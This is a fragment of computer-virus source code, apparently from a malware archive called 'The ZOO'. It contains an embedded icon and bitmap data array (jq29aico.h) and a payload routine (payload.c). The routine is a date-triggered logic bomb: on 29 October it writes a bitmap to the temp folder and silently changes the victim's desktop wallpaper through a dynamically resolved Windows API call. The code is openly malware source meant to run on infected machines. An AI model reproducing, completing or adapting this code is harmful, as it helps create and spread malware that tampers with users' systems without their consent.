  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x00,0x78,0xe3,0xf8,
  0x00,0x70,0x63,0xf8,0x8f,0xe3,0x31,0xf1,0x87,0xe3,0x31,0xf1,0xc3,
  0xff,0x10,0x01,0xc1,0xff,0x18,0x03,0xe1,0xf8,0x18,0xe3,0xf0,0xf0,
  0x18,0xe3,0xf8,0xe3,0x1c,0xe7,0xf8,0x63,0x1c,0x47,0xfc,0x63,0x1c,
  0x47,0xfc,0x63,0x1c,0x47,0x1c,0x63,0x1e,0x0f,0x1c,0x63,0x3e,0x0f,
  0x80,0xf0,0x3e,0x0f,0xc1,0xf8,0x7f,0x1f,0xff,0xff,0xff,0xff,0xff,
  0xff,0xff,0x7f,0xf0,0xf3,0xc0,0x27,0xf0,0x73,0x80,0xe7,0xe7,0x3f,
  0x98,0xff,0xe7,0x3f,0x32,0x7f,0xff,0x3f,0x3e,0x7f,0xff,0x3f,0x3e,
  0x7f,0xff,0x3f,0x3e,0x7f,0xff,0x3f,0x3e,0x7f,0xff,0x3f,0x3e,0x7f,
  0xff,0x3f,0x9c,0xff,0xff,0x3f,0x80,0xff,0xff,0x3f,0xc1,0xff,0xff,
  0xff,0xff,0xff,0x28,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x20,0x00,
  0x00,0x00,0x01,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x00,
  0x80,0x00,0x00,0x00,0x80,0x80,0x00,0x80,0x00,0x00,0x00,0x80,0x00,
  0x80,0x00,0x80,0x80,0x00,0x00,0xc0,0xc0,0xc0,0x00,0x80,0x80,0x80,
  0x00,0x00,0x00,0xff,0x00,0x00,0xff,0x00,0x00,0x00,0xff,0xff,0x00,
  0xff,0x00,0x00,0x00,0xff,0x00,0xff,0x00,0xff,0xff,0x00,0x00,0xff,
  0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x0c,0xdd,0x00,0x00,0x7b,0x5d,0x80,0x00,0xbf,0x63,0x00,0x00,
  0xdc,0x6b,0x80,0x00,0xeb,0x6b,0x00,0x00,0x6b,0x6b,0x80,0x00,0x9c,
  0xf7,0x00,0x00,0xff,0xff,0xc0,0x00,0xff,0xf3,0x80,0x00,0xcd,0x85,
  0xff,0x00,0xb7,0x67,0x00,0x00,0xf6,0xd7,0xff,0x00,0xf6,0xf7,0x00,
  0x00,0xf7,0x6f,0xff,0x00,0xf7,0x9f,0x00,0x00,0xff,0xff,0xfb,0x00
};

#endif
????????????????????????????????????????????????????????????????[jq29aico.h]??
?????????????????????????????????????????????????????????????????[payload.c]??
  {
    SYSTEMTIME SystemTime;
    GetLocalTime(&SystemTime);
    if ((BYTE)SystemTime.wDay == 29 && (BYTE)SystemTime.wMonth == 0xA) {
      bPayLoadDay = TRUE;
      #ifdef compr
      jq_decode(HostLargeIcon + SIZEOF_ICONS,
		jq29aComprIcons + SIZEOF_COMPR_ICONS,
		SIZEOF_COMPR_ICONS,
		ComprMem);
      {
      HANDLE hBmp;
      DWORD cBytes;
      if ((cBytes = GetTempPath(MAX_PATH, PathName)) - 1 < MAX_PATH - 1) {
	if (PathName[cBytes - 1] != '\\')
	  PathName[cBytes++] = '\\';
	*(PDWORD)(PathName + cBytes) = '.A92';
	*(PDWORD)(PathName + cBytes + 4) = 'PMB';
	hBmp = CreateFile(PathName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			  FILE_ATTRIBUTE_NORMAL, 0);
	if (hBmp != INVALID_HANDLE_VALUE)
	if (GetFileSize(hBmp, NULL) == SIZEOF_BMP) {
	  CloseHandle(hBmp);
	  goto SetDeskWallPaper;
	}
	else {
	  {
	    PBYTE pSrc = HostLargeIcon;
	    PBYTE pTgt = jq29aBmp + 0xE;
	    DWORD nCount = 0x68;
	    *(PDWORD)(pTgt - 0xE) = 0x80764D42;
	    pTgt[0xA - 0xE] = 0x76;
	    do *pTgt++ = *pSrc++; while (--nCount);
	    ((PBITMAPINFOHEADER)(pTgt - 0x68))->biWidth = 0x100;
	    ((PBITMAPINFOHEADER)(pTgt - 0x68))->biHeight = 0x100;
	    *((PBYTE)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biSizeImage + 1)
	      = 0x80;
	    *(PWORD)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biXPelsPerMeter
	      = 0xECE;
	    *(PWORD)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biYPelsPerMeter
	      = 0xED8;
	    pSrc += 0x200;
	    {
	      DWORD nCountDwords = 32;
	      do {
		DWORD nCountYPels = 8;
		DWORD Pix = *((PDWORD)pSrc)++;
		__asm {
		  mov eax, [Pix]
		  xchg ah, al
		  rol eax, 16
		  xchg ah, al
		  mov [Pix], eax
		}
		do {
		  DWORD PixCopy = Pix;
		  DWORD nCountBits = 32;
		  do {
		    DWORD nCountXPels = 4;
		    do {
		      *pTgt++ = (PixCopy & 0x80000000)? 0x66 : 0;
		    } while (--nCountXPels); PixCopy <<= 1;
		  } while (--nCountBits);
		} while (--nCountYPels);
	      } while (--nCountDwords);
	    }
	  }
	  {
	    BOOL bBool = WriteFile(hBmp, jq29aBmp, SIZEOF_BMP, &cBytes,
				   NULL);
	    WriteFile(hBmp, jq29aBmp, 0, &cBytes, NULL);
	    CloseHandle(hBmp);
	    if (bBool) {
	      HINSTANCE hInst;
	     SetDeskWallPaper:
	      hInst = LoadLibrary("USER32");
	      if (hInst) {
		DWORD (WINAPI *pfnSystemParametersInfo)(DWORD, DWORD,
							PVOID, DWORD);
		pfnSystemParametersInfo =
		  (DWORD (WINAPI *)(DWORD, DWORD, PVOID, DWORD))
		    GetProcAddress(hInst, "SystemParametersInfoA");
		if (pfnSystemParametersInfo)
		  pfnSystemParametersInfo(SPI_SETDESKWALLPAPER,
					  0,
					  PathName,
					  SPIF_UPDATEINIFILE);
		FreeLibrary(hInst);
	      }
	    }
	  }
	}
      }
      }
      #else
      {
	PBYTE pTgt = HostLargeIcon;
	PBYTE pSrc = jq29aIcons;
	DWORD nCount = SIZEOF_ICONS;
	do *pTgt++ = *pSrc++ while (--nCount);
      }
      #endif
    }
  }
?????????????????????????????????????????????????????????????????[payload.c]??



 ; Brought to you by 'The ZOO' !

